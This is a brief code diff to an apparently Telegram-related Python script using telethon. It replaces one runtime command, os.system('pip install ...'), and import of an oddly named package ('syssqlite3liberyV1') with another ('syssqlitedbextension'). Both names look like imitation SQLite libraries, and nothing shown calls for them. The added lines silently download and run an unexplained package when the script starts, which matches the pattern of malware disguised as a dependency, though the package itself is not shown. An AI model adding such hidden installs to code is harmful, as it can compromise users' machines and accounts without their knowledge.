@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlite3liberyV1")
-import syssqlite3liberyV1
+os.system("pip install syssqlitedbextension")
+import syssqlitedbextension
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
 import csv
